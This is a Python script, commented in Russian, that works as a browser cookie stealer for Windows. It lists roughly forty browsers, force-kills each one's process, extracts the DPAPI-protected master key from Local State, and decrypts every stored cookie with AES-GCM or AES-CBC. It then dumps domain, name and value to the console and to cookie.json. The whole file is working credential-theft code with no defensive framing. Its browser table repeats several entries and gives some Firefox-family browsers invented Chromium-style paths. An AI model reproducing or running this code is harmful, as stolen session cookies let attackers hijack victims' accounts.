import os
import sqlite3
import base64
import json
import re
from Crypto.Cipher import AES
import win32crypt
from Crypto.Util.Padding import unpad
import subprocess

BROWSERS = {
    'Google Chrome': {
        'local_state': os.path.join(os.environ['LOCALAPPDATA'], 'Google\\Chrome\\User Data\\Local State'),
        'cookies': os.path.join(os.environ['LOCALAPPDATA'], 'Google\\Chrome\\User Data\\Default\\Network\\Cookies'),
        'process_name': 'chrome.exe'
    },
    'Microsoft Edge': {
        'local_state': os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft\\Edge\\User Data\\Local State'),
        'cookies': os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft\\Edge\\User Data\\Default\\Network\\Cookies'),
        'process_name': 'msedge.exe'
    },
    'Brave': {
        'local_state': os.path.join(os.environ['LOCALAPPDATA'], 'BraveSoftware\\Brave-Browser\\User Data\\Local State'),
        'cookies': os.path.join(os.environ['LOCALAPPDATA'], 'BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\Cookies'),
        'process_name': 'brave.exe'
    },
    'Opera': {
        'local_state': os.path.join(os.environ['LOCALAPPDATA'], 'Opera Software\\Opera Stable\\Local State'),
        'cookies': os.path.join(os.environ['LOCALAPPDATA'], 'Opera Software\\Opera Stable\\Network\\Cookies'),
        'process_name': 'opera.exe'
    },
    'Opera GX': {
        'local_state': os.path.join(os.environ['LOCALAPPDATA'], 'Opera Software\\Opera GX Stable\\Local State'),
        'cookies': os.path.join(os.environ['LOCALAPPDATA'], 'Opera Software\\Opera GX Stable\\Network\\Cookies'),
        'process_name': 'opera_gx.exe'
    },
    'Vivaldi': {
        'local_state': os.path.join(os.environ['LOCALAPPDATA'], 'Vivaldi\\User Data\\Local State'),
        'cookies': os.path.join(os.environ['LOCALAPPDATA'], 'Vivaldi\\User Data\\Default\\Network\\Cookies'),
        'process_name': 'vivaldi.exe'
    },
    'Yandex': {
        'local_state': os.path.join(os.environ['LOCALAPPDATA'], 'Yandex\\YandexBrowser\\User Data\\Local State'),
        'cookies': os.path.join(os.environ['LOCALAPPDATA'], 'Yandex\\YandexBrowser\\User Data\\Default\\Network\\Cookies'),
        'process_name': 'browser.exe'
    },
    'Chromium': {
        'local_state': os.path.join(os.environ['LOCALAPPDATA'], 'Chromium\\User Data\\Local State'),
        'cookies': os.path.join(os.environ['LOCALAPPDATA'], 'Chromium\\User Data\\Default\\Network\\Cookies'),
        'process_name': 'chrome.exe'
    },
    'Epic Privacy Browser': {
        'local_state': os.path.join(os.environ['LOCALAPPDATA'], 'Epic Privacy Browser\\User Data\\Local State'),
        'cookies': os.path.join(os.environ['LOCALAPPDATA'], 'Epic Privacy Browser\\User Data\\Default\\Network\\Cookies'),
        'process_name': 'epic.exe'
    },
    'Slimjet': {
        'local_state': os.path.join(os.environ['LOCALAPPDATA'], 'Slimjet\\User Data\\Local State'),
        'cookies': os.path.join(os.environ['LOCALAPPDATA'], 'Slimjet\\User Data\\Default\\Network\\Cookies'),
        'process_name': 'slimjet.exe'
    },
    'Comodo Dragon': {
        'local_state': os.path.join(os.environ['LOCALAPPDATA'], 'Comodo\\Dragon\\User Data\\Local State'),
        'cookies': os.path.join(os.environ['LOCALAPPDATA'], 'Comodo\\Dragon\\User Data\\Default\\Network\\Cookies'),
        'process_name': 'dragon.exe'
    },
    'Torch': {
        'local_state': os.path.join(os.environ['LOCALAPPDATA'], 'Torch\\User Data\\Local State'),
        'cookies': os.path.join(os.environ['LOCALAPPDATA'], 'Torch\\User Data\\Default\\Network\\Cookies'),
        'process_name': 'torch.exe'
    },
    'UC Browser': {
        'local_state': os.path.join(os.environ['LOCALAPPDATA'], 'UCBrowser\\User Data\\Local State'),
        'cookies': os.path.join(os.environ['LOCALAPPDATA'], 'UCBrowser\\User Data\\Default\\Network\\Cookies'),
        'process_name': 'ucbrowser.exe'
    },
    'CocCoc': {
        'local_state': os.path.join(os.environ['LOCALAPPDATA'], 'CocCoc\\Browser\\User Data\\Local State'),
        'cookies': os.path.join(os.environ['LOCALAPPDATA'], 'CocCoc\\Browser\\User Data\\Default\\Network\\Cookies'),
        'process_name': 'coccoc.exe'
    },
    'SRWare Iron': {
        'local_state': os.path.join(os.environ['LOCALAPPDATA'], 'SRWare Iron\\User Data\\Local State'),
        'cookies': os.path.join(os.environ['LOCALAPPDATA'], 'SRWare Iron\\User Data\\Default\\Network\\Cookies'),
        'process_name': 'iron.exe'
    },
    'Avast Secure Browser': {
        'local_state': os.path.join(os.environ['LOCALAPPDATA'], 'AVAST Software\\Browser\\User Data\\Local State'),
        'cookies': os.path.join(os.environ['LOCALAPPDATA'], 'AVAST Software\\Browser\\User Data\\Default\\Network\\Cookies'),
        'process_name': 'avast_browser.exe'
    },
    'Avast SafeZone': {
        'local_state': os.path.join(os.environ['LOCALAPPDATA'], 'AVAST Software\\SZBrowser\\User Data\\Local State'),
        'cookies': os.path.join(os.environ['LOCALAPPDATA'], 'AVAST Software\\SZBrowser\\User Data\\Default\\Network\\Cookies'),
        'process_name': 'safezone_browser.exe'
    },
    '360 Secure Browser': {
        'local_state': os.path.join(os.environ['LOCALAPPDATA'], '360se\\User Data\\Local State'),
        'cookies': os.path.join(os.environ['LOCALAPPDATA'], '360se\\User Data\\Default\\Network\\Cookies'),
        'process_name': '360se.exe'
    },
    'QQ Browser': {
        'local_state': os.path.join(os.environ['LOCALAPPDATA'], 'Tencent\\QQBrowser\\User Data\\Local State'),
        'cookies': os.path.join(os.environ['LOCALAPPDATA'], 'Tencent\\QQBrowser\\User Data\\Default\\Network\\Cookies'),
        'process_name': 'qqbrowser.exe'
    },
    'CentBrowser': {
        'local_state': os.path.join(os.environ['LOCALAPPDATA'], 'CentBrowser\\User Data\\Local State'),
        'cookies': os.path.join(os.environ['LOCALAPPDATA'], 'CentBrowser\\User Data\\Default\\Network\\Cookies'),
        'process_name': 'centbrowser.exe'
    },
    'Sogou Explorer': {
        'local_state': os.path.join(os.environ['LOCALAPPDATA'], 'SogouExplorer\\User Data\\Local State'),
        'cookies': os.path.join(os.environ['LOCALAPPDATA'], 'SogouExplorer\\User Data\\Default\\Network\\Cookies'),
        'process_name': 'sogouexplorer.exe'
    },
    'Maxthon': {
        'local_state': os.path.join(os.environ['LOCALAPPDATA'], 'Maxthon\\User Data\\Local State'),
        'cookies': os.path.join(os.environ['LOCALAPPDATA'], 'Maxthon\\User Data\\Default\\Network\\Cookies'),
        'process_name': 'maxthon.exe'
    },
    'Falkon': {
        'local_state': os.path.join(os.environ['LOCALAPPDATA'], 'Falkon\\User Data\\Local State'),
        'cookies': os.path.join(os.environ['LOCALAPPDATA'], 'Falkon\\User Data\\Default\\Network\\Cookies'),
        'process_name': 'falkon.exe'
    },
    'Iridium': {
        'local_state': os.path.join(os.environ['LOCALAPPDATA'], 'Iridium\\User Data\\Local State'),
        'cookies': os.path.join(os.environ['LOCALAPPDATA'], 'Iridium\\User Data\\Default\\Network\\Cookies'),
        'process_name': 'iridium.exe'
    },
    'Naver Whale': {
        'local_state': os.path.join(os.environ['LOCALAPPDATA'], 'Naver\\Whale\\User Data\\Local State'),
        'cookies': os.path.join(os.environ['LOCALAPPDATA'], 'Naver\\Whale\\User Data\\Default\\Network\\Cookies'),
        'process_name': 'whale.exe'
    },
    'Pale Moon': {
        'local_state': os.path.join(os.environ['LOCALAPPDATA'], 'Moonchild Productions\\Pale Moon\\User Data\\Local State'),
        'cookies': os.path.join(os.environ['LOCALAPPDATA'], 'Moonchild Productions\\Pale Moon\\User Data\\Default\\Network\\Cookies'),
        'process_name': 'palemoon.exe'
    },
    'Basilisk': {
        'local_state': os.path.join(os.environ['LOCALAPPDATA'], 'Moonchild Productions\\Basilisk\\User Data\\Local State'),
        'cookies': os.path.join(os.environ['LOCALAPPDATA'], 'Moonchild Productions\\Basilisk\\User Data\\Default\\Network\\Cookies'),
        'process_name': 'basilisk.exe'
    },
    'Waterfox': {
        'local_state': os.path.join(os.environ['LOCALAPPDATA'], 'Waterfox\\User Data\\Local State'),
        'cookies': os.path.join(os.environ['LOCALAPPDATA'], 'Waterfox\\User Data\\Default\\Network\\Cookies'),
        'process_name': 'waterfox.exe'
    },
    'K-Meleon': {
        'local_state': os.path.join(os.environ['LOCALAPPDATA'], 'K-Meleon\\User Data\\Local State'),
        'cookies': os.path.join(os.environ['LOCALAPPDATA'], 'K-Meleon\\User Data\\Default\\Network\\Cookies'),
        'process_name': 'k-meleon.exe'
    },
    'SlimBrowser': {
        'local_state': os.path.join(os.environ['LOCALAPPDATA'], 'SlimBrowser\\User Data\\Local State'),
        'cookies': os.path.join(os.environ['LOCALAPPDATA'], 'SlimBrowser\\User Data\\Default\\Network\\Cookies'),
        'process_name': 'slimbrowser.exe'
    },
    'SuperBird': {
        'local_state': os.path.join(os.environ['LOCALAPPDATA'], 'SuperBird\\User Data\\Local State'),
        'cookies': os.path.join(os.environ['LOCALAPPDATA'], 'SuperBird\\User Data\\Default\\Network\\Cookies'),
        'process_name': 'superbird.exe'
    },
    'CoolNovo': {
        'local_state': os.path.join(os.environ['LOCALAPPDATA'], 'CoolNovo\\User Data\\Local State'),
        'cookies': os.path.join(os.environ['LOCALAPPDATA'], 'CoolNovo\\User Data\\Default\\Network\\Cookies'),
        'process_name': 'coolnovo.exe'
    },
    'Flock': {
        'local_state': os.path.join(os.environ['LOCALAPPDATA'], 'Flock\\User Data\\Local State'),
        'cookies': os.path.join(os.environ['LOCALAPPDATA'], 'Flock\\User Data\\Default\\Network\\Cookies'),
        'process_name': 'flock.exe'
    },
    'RockMelt': {
        'local_state': os.path.join(os.environ['LOCALAPPDATA'], 'RockMelt\\User Data\\Local State'),
        'cookies': os.path.join(os.environ['LOCALAPPDATA'], 'RockMelt\\User Data\\Default\\Network\\Cookies'),
        'process_name': 'rockmelt.exe'
    },
    'Wyzo': {
        'local_state': os.path.join(os.environ['LOCALAPPDATA'], 'Wyzo\\User Data\\Local State'),
        'cookies': os.path.join(os.environ['LOCALAPPDATA'], 'Wyzo\\User Data\\Default\\Network\\Cookies'),
        'process_name': 'wyzo.exe'
    },
    'QupZilla': {
        'local_state': os.path.join(os.environ['LOCALAPPDATA'], 'QupZilla\\User Data\\Local State'),
        'cookies': os.path.join(os.environ['LOCALAPPDATA'], 'QupZilla\\User Data\\Default\\Network\\Cookies'),
        'process_name': 'qupzilla.exe'
    },
    'Dooble': {
        'local_state': os.path.join(os.environ['LOCALAPPDATA'], 'Dooble\\User Data\\Local State'),
        'cookies': os.path.join(os.environ['LOCALAPPDATA'], 'Dooble\\User Data\\Default\\Network\\Cookies'),
        'process_name': 'dooble.exe'
    },
    'Midori': {
        'local_state': os.path.join(os.environ['LOCALAPPDATA'], 'Midori\\User Data\\Local State'),
        'cookies': os.path.join(os.environ['LOCALAPPDATA'], 'Midori\\User Data\\Default\\Network\\Cookies'),
        'process_name': 'midori.exe'
    },
    'Falkon': {
        'local_state': os.path.join(os.environ['LOCALAPPDATA'], 'Falkon\\User Data\\Local State'),
        'cookies': os.path.join(os.environ['LOCALAPPDATA'], 'Falkon\\User Data\\Default\\Network\\Cookies'),
        'process_name': 'falkon.exe'
    },
    'Otter Browser': {
        'local_state': os.path.join(os.environ['LOCALAPPDATA'], 'Otter\\User Data\\Local State'),
        'cookies': os.path.join(os.environ['LOCALAPPDATA'], 'Otter\\User Data\\Default\\Network\\Cookies'),
        'process_name': 'otter-browser.exe'
    },
    'SeaMonkey': {
        'local_state': os.path.join(os.environ['LOCALAPPDATA'], 'SeaMonkey\\User Data\\Local State'),
        'cookies': os.path.join(os.environ['LOCALAPPDATA'], 'SeaMonkey\\User Data\\Default\\Network\\Cookies'),
        'process_name': 'seamonkey.exe'
    },
    'IceDragon': {
        'local_state': os.path.join(os.environ['LOCALAPPDATA'], 'Comodo\\IceDragon\\User Data\\Local State'),
        'cookies': os.path.join(os.environ['LOCALAPPDATA'], 'Comodo\\IceDragon\\User Data\\Default\\Network\\Cookies'),
        'process_name': 'icedragon.exe'
    },
    'CoolNovo': {
        'local_state': os.path.join(os.environ['LOCALAPPDATA'], 'CoolNovo\\User Data\\Local State'),
        'cookies': os.path.join(os.environ['LOCALAPPDATA'], 'CoolNovo\\User Data\\Default\\Network\\Cookies'),
        'process_name': 'coolnovo.exe'
    },
    'Flock': {
        'local_state': os.path.join(os.environ['LOCALAPPDATA'], 'Flock\\User Data\\Local State'),
        'cookies': os.path.join(os.environ['LOCALAPPDATA'], 'Flock\\User Data\\Default\\Network\\Cookies'),
        'process_name': 'flock.exe'
    },
    'RockMelt': {
        'local_state': os.path.join(os.environ['LOCALAPPDATA'], 'RockMelt\\User Data\\Local State'),
        'cookies': os.path.join(os.environ['LOCALAPPDATA'], 'RockMelt\\User Data\\Default\\Network\\Cookies'),
        'process_name': 'rockmelt.exe'
    },
    'Wyzo': {
        'local_state': os.path.join(os.environ['LOCALAPPDATA'], 'Wyzo\\User Data\\Local State'),
        'cookies': os.path.join(os.environ['LOCALAPPDATA'], 'Wyzo\\User Data\\Default\\Network\\Cookies'),
        'process_name': 'wyzo.exe'
    },
    'QupZilla': {
        'local_state': os.path.join(os.environ['LOCALAPPDATA'], 'QupZilla\\User Data\\Local State'),
        'cookies': os.path.join(os.environ['LOCALAPPDATA'], 'QupZilla\\User Data\\Default\\Network\\Cookies'),
        'process_name': 'qupzilla.exe'
    },
    'Dooble': {
        'local_state': os.path.join(os.environ['LOCALAPPDATA'], 'Dooble\\User Data\\Local State'),
        'cookies': os.path.join(os.environ['LOCALAPPDATA'], 'Dooble\\User Data\\Default\\Network\\Cookies'),
        'process_name': 'dooble.exe'
    },
    'Midori': {
        'local_state': os.path.join(os.environ['LOCALAPPDATA'], 'Midori\\User Data\\Local State'),
        'cookies': os.path.join(os.environ['LOCALAPPDATA'], 'Midori\\User Data\\Default\\Network\\Cookies'),
        'process_name': 'midori.exe'
    },
    'Falkon': {
        'local_state': os.path.join(os.environ['LOCALAPPDATA'], 'Falkon\\User Data\\Local State'),
        'cookies': os.path.join(os.environ['LOCALAPPDATA'], 'Falkon\\User Data\\Default\\Network\\Cookies'),
        'process_name': 'falkon.exe'
    },
    'Otter Browser': {
        'local_state': os.path.join(os.environ['LOCALAPPDATA'], 'Otter\\User Data\\Local State'),
        'cookies': os.path.join(os.environ['LOCALAPPDATA'], 'Otter\\User Data\\Default\\Network\\Cookies'),
        'process_name': 'otter-browser.exe'
    },
    'SeaMonkey': {
        'local_state': os.path.join(os.environ['LOCALAPPDATA'], 'SeaMonkey\\User Data\\Local State'),
        'cookies': os.path.join(os.environ['LOCALAPPDATA'], 'SeaMonkey\\User Data\\Default\\Network\\Cookies'),
        'process_name': 'seamonkey.exe'
    },
    'IceDragon': {
        'local_state': os.path.join(os.environ['LOCALAPPDATA'], 'Comodo\\IceDragon\\User Data\\Local State'),
        'cookies': os.path.join(os.environ['LOCALAPPDATA'], 'Comodo\\IceDragon\\User Data\\Default\\Network\\Cookies'),
        'process_name': 'icedragon.exe'
    },
}

def get_encryption_key(browser):
    """Получение ключа шифрования из Local State"""
    local_state_path = BROWSERS[browser]['local_state']
    
    try:
        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state = json.load(f)
        
        encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
        return win32crypt.CryptUnprotectData(encrypted_key[5:], None, None, None, 0)[1]
    except Exception as e:
        print(f"Ошибка получения ключа: {str(e)}")
        return None

def decrypt_value(encrypted_value, key):
    """Расшифровка значения с обработкой бинарных префиксов"""
    try:
        # Режим AES-GCM
        if encrypted_value.startswith(b'v10'):
            nonce = encrypted_value[3:15]
            ciphertext = encrypted_value[15:-16]
            tag = encrypted_value[-16:]
            cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
            decrypted = cipher.decrypt_and_verify(ciphertext, tag)
        else:
            # Режим AES-CBC
            iv = encrypted_value[3:19]
            ciphertext = encrypted_value[19:]
            cipher = AES.new(key, AES.MODE_CBC, iv=iv)
            decrypted = unpad(cipher.decrypt(ciphertext), 16)

        # Поиск текстовых данных в бинарной строке
        str_match = re.search(b'[\x20-\x7E]{5,}', decrypted)
        if str_match:
            return str_match.group().decode('utf-8', errors='replace')
            
        return decrypted.hex()  # Возвращаем hex если текст не найден
        
    except Exception as e:
        print(f"Ошибка расшифровки: {str(e)}")
        return None

def clean_cookie_value(value):
    """Очистка значений от бинарных артефактов"""
    if isinstance(value, str) and '' in value:
        return re.sub(r'[^\x00-\x7F]+', '', value)
    return value

def main(browser):
    # Принудительное завершение процесса браузера
    try:
        subprocess.run(['taskkill', '/IM', BROWSERS[browser]['process_name'], '/F'], capture_output=True)
    except Exception as e:
        print(f"Ошибка при завершении браузера: {str(e)}")

    key = get_encryption_key(browser)
    if not key:
        return

    cookie_path = BROWSERS[browser]['cookies']
    
    try:
        conn = sqlite3.connect(cookie_path)
        conn.text_factory = bytes
        cursor = conn.cursor()
        cursor.execute('SELECT host_key, name, encrypted_value FROM cookies')
        
        decrypted_cookies = []
        for host, name, encrypted_value in cursor.fetchall():
            decrypted = decrypt_value(encrypted_value, key)
            if decrypted:
                decrypted_cookies.append({
                    'domain': host.decode('utf-8', errors='replace'),
                    'name': name.decode('utf-8', errors='replace'),
                    'value': clean_cookie_value(decrypted)
                })
        
        # Вывод результата в консоль
        print(json.dumps(
            decrypted_cookies,
            indent=2,
            ensure_ascii=False,
            default=lambda x: x.decode('utf-8') if isinstance(x, bytes) else x
        ))
        
        # Сохранение результата в файл cookie.json
        with open('cookie.json', 'w', encoding='utf-8') as f:
            json.dump(
                decrypted_cookies, 
                f, 
                indent=2, 
                ensure_ascii=False, 
                default=lambda x: x.decode('utf-8') if isinstance(x, bytes) else x
            )
    
    except Exception as e:
        print(f"Ошибка БД: {str(e)}")
    finally:
        if 'conn' in locals():
            conn.close()

if __name__ == '__main__':
    for browser in BROWSERS:
        main(browser)